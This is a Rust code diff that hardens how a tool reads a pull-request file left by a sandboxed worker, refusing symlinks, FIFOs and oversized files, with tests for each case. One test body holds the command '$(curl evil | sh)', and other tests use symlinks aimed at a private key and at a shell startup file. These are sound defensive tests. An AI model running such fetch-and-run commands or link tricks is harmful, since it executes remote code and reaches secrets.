@@ -7,11 +7,10 @@
 //! pushed and no pull request, and sets the title and body again when a
 //! later turn changed the file.
 
-use std::fs;
-use std::io::ErrorKind;
 use std::path::{Path, PathBuf};
 
 use super::Runner;
+use crate::worker_folder;
 use crate::worktree::BASE;
 
 /// The file the worker writes its pull request in, in its build folder
@@ -87,7 +86,8 @@ impl Runner {
         let Some(file) = self.read_handed_over(build) else {
             return;
         };
-        if fs::read_to_string(build.join(APPLIED)).is_ok_and(|applied| applied == file) {
+        let applied = worker_folder::read(build, Path::new(APPLIED));
+        if applied.is_ok_and(|applied| applied.as_deref() == Some(file.as_str())) {
             return;
         }
         let Some(text) = parse(&file) else {
@@ -101,29 +101,21 @@ impl Runner {
         }
     }
 
-    // The file, or none when the worker left none. One that cannot be read
-    // is told.
+    // The file, or none when the worker left none. One that cannot be read,
+    // or is a link or not a regular file, is told, never followed or quoted.
     fn read_handed_over(&self, build: &Path) -> Option<String> {
-        match fs::read_to_string(path(build)) {
-            Ok(file) => Some(file),
-            Err(e) if e.kind() == ErrorKind::NotFound => None,
-            Err(e) => {
-                self.notes.push(format!(
-                    "cannot read {}: {}",
-                    path(build).display(),
-                    e.kind()
-                ));
-                None
-            }
-        }
+        worker_folder::read(build, Path::new(FILE)).unwrap_or_else(|e| {
+            self.notes
+                .push(format!("cannot read {}: {e}", path(build).display()));
+            None
+        })
     }
 
     fn keep_applied(&self, build: &Path, file: &str) {
-        if let Err(e) = fs::write(build.join(APPLIED), file) {
+        if let Err(e) = worker_folder::write(build, Path::new(APPLIED), file) {
             self.notes.push(format!(
-                "cannot write {}: {}",
-                build.join(APPLIED).display(),
-                e.kind()
+                "cannot write {}: {e}",
+                build.join(APPLIED).display()
             ));
         }
     }
@@ -345,6 +337,73 @@ body
 
         edit("feat: second");
         assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: second");
+    }
+
+    // The worker can write its build folder, and kelpie reads and writes it as
+    // the maintainer, outside the sandbox: a link there must lead nowhere.
+    fn key_the_worker_must_not_reach(rig: &Rig) -> PathBuf {
+        let key = rig.home.path().join("key.pem");
+        std::fs::write(&key, "-----BEGIN PRIVATE KEY-----\nthe-apps-key\n").unwrap();
+        key
+    }
+
+    #[test]
+    fn a_file_that_links_to_a_secret_is_refused_and_nothing_is_posted() {
+        let (rig, runner) = with_issue_7(true);
+        let key = key_the_worker_must_not_reach(&rig);
+        std::os::unix::fs::symlink(&key, path(&rig.build_7())).unwrap();
+        rig.claude.script([Scripted::Push("work.txt", "work\n")]);
+
+        step(&runner).unwrap();
+
+        assert_eq!(rig.forge.text_of(500), None);
+        let status = rig.ask(&runner, "status", None);
+        assert_eq!(status["work_item"]["pull_request"], serde_json::Value::Null);
+        let notes = runner.lock().unwrap().take_notes().join("\n");
+        assert!(notes.contains("pull-request.md"), "{notes}");
+        assert!(notes.contains("not a regular file"), "{notes}");
+        assert!(!notes.contains("the-apps-key"), "{notes}");
+    }
+
+    #[test]
+    fn a_file_that_is_a_fifo_or_over_the_cap_is_refused_without_hanging() {
+        let (rig, runner) = with_issue_7(true);
+        let (build, mut runner) = (rig.build_7(), runner.lock().unwrap());
+        let file = path(&build);
+
+        nix::unistd::mkfifo(&file, nix::sys::stat::Mode::S_IRWXU).unwrap();
+        assert_eq!(runner.open_handed_over(&build, "kelpie/7"), None);
+        runner.edit_handed_over(&build, 500);
+        std::fs::remove_file(&file).unwrap();
+
+        let two_mib = format!("feat: x\n\n{}", "y".repeat(2 << 20));
+        std::fs::write(&file, two_mib).unwrap();
+        assert_eq!(runner.open_handed_over(&build, "kelpie/7"), None);
+        runner.edit_handed_over(&build, 500);
+
+        assert_eq!(rig.forge.text_of(500), None);
+        let notes = runner.take_notes();
+        assert_eq!(notes.len(), 4, "{notes:?}");
+        assert!(notes[0].contains("not a regular file"), "{notes:?}");
+        assert!(notes[2].contains("over"), "{notes:?}");
+    }
+
+    #[test]
+    fn a_copy_that_links_to_a_file_leaves_that_file_alone() {
+        let (rig, runner) = with_issue_7(true);
+        let (build, runner) = (rig.build_7(), runner.lock().unwrap());
+        rig.forge.open_pull_request(500, "kelpie/7", &[7]);
+        let rc = rig.home.path().join(".zshrc");
+        std::fs::write(&rc, "export A=1\n").unwrap();
+        std::os::unix::fs::symlink(&rc, build.join(APPLIED)).unwrap();
+        std::fs::write(path(&build), "feat: x\n\n$(curl evil | sh)\n").unwrap();
+
+        runner.edit_handed_over(&build, 500);
+
+        assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
+        assert_eq!(rig.forge.text_of(500).unwrap().0, "feat: x");
+        let copy = std::fs::read_to_string(build.join(APPLIED)).unwrap();
+        assert!(copy.contains("curl evil"), "{copy}");
     }
 
     #[test]
